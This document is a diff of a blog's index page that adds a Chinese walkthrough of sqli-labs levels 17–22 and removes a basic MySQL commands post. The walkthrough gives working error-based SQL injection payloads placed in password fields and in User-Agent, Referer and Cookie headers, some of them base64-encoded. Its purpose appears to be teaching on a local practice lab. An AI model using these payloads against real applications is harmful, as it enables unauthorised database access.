@@ -236,6 +236,246 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/29/Sqli-labs Less17-22/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/10/29/Sqli-labs Less17-22/" itemprop="url">Sqli-labs Less17-22</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-29T08:15:41+08:00">
+                2018-10-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在做<code>less-17</code>之前,需要先了解一些MYSQL基础增删改查的命令:<a href="https://p0rz9.github.io/2018/10/12/mysql%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" target="_blank" rel="noopener">基础知识 | MYSQL基础命令</a></p>
+<h2 id="less-17-update注入"><a href="#less-17-update注入" class="headerlink" title="less-17 update注入"></a>less-17 update注入</h2><p>经测试在 admin字段中无报错信息<br>我们测试password字段:<br>uname=admin&amp;passwd=admin’&amp;submit=Submit<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.11.59.10-image.png" alt="2018-10-29.11.59.10-image.png"></p>
+<p>查看报错即可知道这里用<code>&#39;</code>闭合即可,且这里显示出sql错误,所以可用报错注入或延时注入,下面介绍下报错注入:</p>
+<pre><code>uname=admin&amp;passwd=admin&apos; and updatexml(1,concat(0x7e,(select database()),0x7e),1)%23&amp;submit=Submit  #得到数据库名
+</code></pre><p>然后将select database()换为其他查询语句即可(可参考less-5的查询语句)：<br><a href="https://p0rz9.github.io/2018/10/23/Sqli-labs_Blind_injection_Less5-6/" target="_blank" rel="noopener">Sqli-labs_Blind_injection_Less5-6/</a></p>
+<p>less-17的sql语句为:</p>
+<pre><code>function check_input($value)
+{
+if(!empty($value))
+    {
+    // truncation (see comments)
+    $value = substr($value,0,15);
+    }
+
+    // Stripslashes if magic quotes enabled
+    if (get_magic_quotes_gpc())
+        {
+        $value = stripslashes($value);
+        }
+
+    // Quote if not a number
+    if (!ctype_digit($value))
+        {
+        $value = &quot;&apos;&quot; . mysql_real_escape_string($value) . &quot;&apos;&quot;;
+        }
+
+else
+    {
+    $value = intval($value);
+    }
+return $value;
+}
+......
+$update=&quot;UPDATE users SET password = &apos;$passwd&apos; WHERE username=&apos;$row1&apos;&quot;;
+</code></pre><p>查看源代码就可理解这里的<code>uname</code>字段为什么不能注入了,因为经过check_input安全函数过滤：</p>
+<pre><code>★addslashes() #预定字符之前添加反斜杠并返回
+注:PHP会默认(gpc为on状态)对所有的GET POST COOKIE数据自动运行addslashes,所以不应该对已转义过的字符使用addslashes()操作,会造成双层转义。
+遇到这种情况,一般使用get_magic_quotes_gpc()进行检测。
+
+★stripslashes() #删除由addslashes()添加的反斜杠
+
+★mysql_real_escape_string() #转义sql语句中使用的特殊字符`
+</code></pre><p>经过这几个函数处理,所以<code>uname</code>这个字段不能注入了。<br>那这里注入的语句使用的是update操作  我们在挖掘CMS的漏洞时,也可以将查询语句拼接到后面,然后再找一处查询该数据表内容的地方形成注入(update insert注入)</p>
+<hr>
+<p>在接下来的几关都属于HTTP头注入,我们需要先了解一下一些http基础:</p>
+<pre><code>Accept： 浏览器能够处理的内容类型
+Accept-Charset： 浏览器能够显示的字符集
+Accept-Encoding：浏览器能够处理的压缩编码。
+Accept-Language： 浏览器当前设置的语言。
+Connection：浏览器与服务器之间连接的类型
+Cookie：当前页面设置的任何Cookie
+Host：发出请求的页面所在的域。
+Referer：发出请求的页面的URI。
+User-Agent：浏览器的用户代理字符串
+Server: WEB 服务器表明自己是什么软件及版本等信息。例如：Server：Apache/2.0.61 (Unix)
+</code></pre><h2 id="less-18-UA头注入"><a href="#less-18-UA头注入" class="headerlink" title="less-18 UA头注入"></a>less-18 UA头注入</h2><p>输入正确的账号密码:admin 0<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.31.25-image.png" alt="2018-10-29.15.31.25-image.png"></p>
+<p>看见这里会显示ip与UA头,我们尝试注入:</p>
+<pre><code>User-Agent: aaaaa&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.22.23-image.png" alt="2018-10-29.15.22.23-image.png"></p>
+<p>ip伪造主要有几个参数:<br><code>X-FORWARDED-FOR</code> 是代理服务器通过<code>HTTP Headers</code>提供的客户端IP.代理服务器可以伪造任何IP.<br><code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code> 就是跟你服务器直接连接的IP. 不可伪造<br><code>CLIENT_IP</code> 可伪造</p>
+<p>这里尝试了几个,ip不可伪造注入</p>
+<p>less-18的sql语句为:</p>
+<pre><code>$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;
+</code></pre><h2 id="less-19-REFERER注入"><a href="#less-19-REFERER注入" class="headerlink" title="less-19 REFERER注入"></a>less-19 REFERER注入</h2><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.15.46.12-image.png" alt="2018-10-29.15.46.12-image.png"><br>放入burp的reperter模块测试:<br>与less-18的payload一样,只不过是从UA头换到了referer处：</p>
+<pre><code>Referer: &apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1),&apos;
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.16.32.48-image.png" alt="2018-10-29.16.32.48-image.png"></p>
+<p>然后将<code>select user()</code>处更换为其他查询语句就ok了</p>
+<p>less-19的sql语句为:</p>
+<pre><code>$uname = check_input($_POST[&apos;uname&apos;]);
+$passwd = check_input($_POST[&apos;passwd&apos;]);
+......
+$insert=&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;)&quot;;
+</code></pre><h2 id="less-20-Cookie注入"><a href="#less-20-Cookie注入" class="headerlink" title="less-20 Cookie注入"></a>less-20 Cookie注入</h2><p>我们查看代码:</p>
+<pre><code>&lt;?php
+if(!isset($_COOKIE[&apos;uname&apos;]))
+    {
+    ...
+        $sql=&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;
+        $result1 = mysql_query($sql);
+        $row1 = mysql_fetch_array($result1);
+        $cookee = $row1[&apos;username&apos;];
+            if($row1)
+                {
+                echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&apos;;
+                setcookie(&apos;uname&apos;, $cookee, time()+3600);    
+                ...
+}
+else
+{
+    if(!isset($_POST[&apos;submit&apos;]))
+        {
+            $cookee = $_COOKIE[&apos;uname&apos;];
+            ...
+            $sql=&quot;SELECT * FROM users WHERE username=&apos;$cookee&apos; LIMIT 0,1&quot;;
+            ...
+        }    
+    else
+        ...
+}
+?&gt;
+</code></pre><p>从源代码可看出,我在第一次登陆时,我们的cookie从username取值,当再次刷新后,会从cookie字段中读取username的值然后进行查询.</p>
+<p>首先填写正确账号密码:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.27-image.png" alt="2018-10-29.17.36.27-image.png"><br>提交之后:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.36.55-image.png" alt="2018-10-29.17.36.55-image.png"></p>
+<p>然后我们刷新时抓包:</p>
+<pre><code>GET /less-20/index.php HTTP/1.1
+Host: 127.0.0.1:86
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+DNT: 1
+Referer: http://127.0.0.1:86/less-20/index.php
+Cookie: uname=admin
+Connection: close
+Cache-Control: max-age=0
+</code></pre><p>修改cookie为：</p>
+<pre><code>Cookie: uname=admin&apos; and updatexml(1,concat(0x7e,(select user()),0x7e),1)%23
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.40.44-image.png" alt="2018-10-29.17.40.44-image.png"></p>
+<p>之后将<code>select user()</code>改为其他查询语句即可。</p>
+<h2 id="less-21-cookie-base64-注入"><a href="#less-21-cookie-base64-注入" class="headerlink" title="less-21 cookie_base64 注入"></a>less-21 cookie_base64 注入</h2><p>与less-20同理,只是将payload的闭合符号<code>&#39;</code>换为<code>&#39;)</code>,再用base64加密一下即可:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.17.50.13-image.png" alt="2018-10-29.17.50.13-image.png"></p>
+<h2 id="less-22"><a href="#less-22" class="headerlink" title="less-22"></a>less-22</h2><p>将less-21的payload的闭合符号<code>&#39;)</code>换为<code>&quot;</code>,再用base64加密一下即可:</p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.18.01.40-image.png" alt="2018-10-29.18.01.40-image.png"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/28/Sqli-labs Less7-16/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -375,7 +615,7 @@ http://127.0.0.1:86/less-7/index.php?id=1%23 正确
 <blockquote>
 <p>如果未加<code>%23(#)</code>显示错误而加上<code>%23(#)</code>显示正确即为闭合符号</p>
 </blockquote>
-<p>我们可看到加上<code>&#39;))</code>这3个字符去访问返回错误,但是在加上注释符(#)去访问就变回正常的了<br>所以我们就可以知道用<code>&#39;))</code>去闭合是正确的,当然这里为了更快速的测试,我把这些放入一个字典当中,用burp的intruder模块去爆破也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-28.20.44.57-image.png" alt="2018-10-28.20.44.57-image.png"><br>根据结果也可判断出<code>&#39;))</code>去闭合是正确的,接下来就是去正常的注入即可:</p>
+<p>我们可看到加上<code>&#39;))</code>这3个字符去访问返回错误,但是在加上注释符(#)去访问就变回正常的了<br>所以我们就可以知道用<code>&#39;))</code>去闭合是正确的,当然这里为了更快速的测试,我把这些放入一个字典当中,用burp的intruder模块去爆破也是可以的:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_10/2018-10-29.12.10.46-image.png" alt="2018-10-29.12.10.46-image.png"><br>根据结果也可判断出<code>&#39;))</code>去闭合是正确的,接下来就是去正常的注入即可:</p>
 <p>判断字段个数</p>
 <pre><code>http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 3%23
 http://127.0.0.1:86/less-7/index.php?id=1&apos;)) order by 4%23
@@ -2437,155 +2677,6 @@ POST: tel[id`) values (1 and updatexml(1,concat(0x7e,user()),1)); -- a]=12
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/12/mysql基础命令/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="P0rZ9">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="P0rZ9's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/10/12/mysql基础命令/" itemprop="url">基础知识 |  MYSQL基础命令</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-12T09:15:41+08:00">
-                2018-10-12
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <blockquote>
-<p>mysql基础知识,持续更新。没事儿敲一敲命令。</p>
-</blockquote>
-<hr>
-<p>mysql基础命令:</p>
-<p>连接:mysql -uroot -proot<br>不区分大小写<br>数据库操作:</p>
-<pre><code>create DATABASE RUNOOB;//创建
-drop database runoop;//删除
-use runoob;//进入runoob库
-</code></pre><p>数据表操作:<br>进入数据库后就可对表进操作:</p>
-<pre><code>创建数据表:
-mysql&gt; create table runoob_tbl(
-    -&gt; runoob_id int not null auto_increment,
-    -&gt; runoob_title varchar(50) not null,
-    -&gt; run_auther varchar(50) not null,
-    -&gt; primary key (runoob_id)
-    -&gt; );
-
-删除数据表:
-mysql&gt;DROP TABLE runoob_tbl
-</code></pre><p>数据字段操作:</p>
-<pre><code>插入数据  //注意字段内容加引号
-mysql&gt; insert into runoob_tbl
--&gt; (runoob_id,runoob_title,run_auther)
--&gt; values
--&gt; (&apos;1&apos;,&apos;test_title&apos;,&apos;P0rZ9&apos;);
-
-查询数据
-mysql-&gt;select * from runoob_tbl;
-</code></pre><hr>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2636,7 +2727,7 @@ mysql-&gt;select * from runoob_tbl;
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">35</span>
+                  <span class="site-state-item-count">36</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
